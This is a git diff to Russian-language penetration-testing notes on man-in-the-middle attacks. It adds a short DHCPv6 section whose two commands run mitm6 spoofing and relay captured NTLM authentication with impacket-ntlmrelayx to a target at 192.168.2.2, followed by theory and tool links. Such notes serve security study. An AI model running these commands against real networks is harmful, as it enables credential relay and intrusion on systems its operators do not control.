@@ -68,6 +68,18 @@ _Gratuitous ARP (RFC 5227)_ может означать как необосно
 Старая версия инструмента проще, но есть и [новая](https://github.com/bettercap/bettercap), написанная на Go.
 
 ### MiTM 6
+
+#### DHCPv6 / MiTM6
+
+1 окно терминала. Сам спуфинг:
+```shell
+sudo mitm6 -i tho0
+```
+2 окно терминала. Пример пересылки данных, собранных спуфигном на сервер с **MySQL**, где **192.168.2.2** - адрес **MySQL**:
+```shell
+sudo impacket-ntlmrelayx -6 -smb2support -t 192.168.2.2
+```
+#### Теория 
 **Под термином MiTM 6** подразумевают всевозможные атаки на протокол IPv6.  
   
 **IPv6** — новая версия интернет-протокола, призванная решить проблемы, с которыми столкнулась предыдущая версия при  
@@ -106,7 +118,6 @@ _Gratuitous ARP (RFC 5227)_ может означать как необосно
 - [mitm6](https://github.com/dirkjanm/mitm6)
 - [yersinia](https://github.com/tomac/yersinia)
 - [scapy](https://github.com/secdev/scapy/)
-
 ## **Материалы для самостоятельного изучения**
 
 - [Методичка по анализу сети](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Network%20Discovery.md)
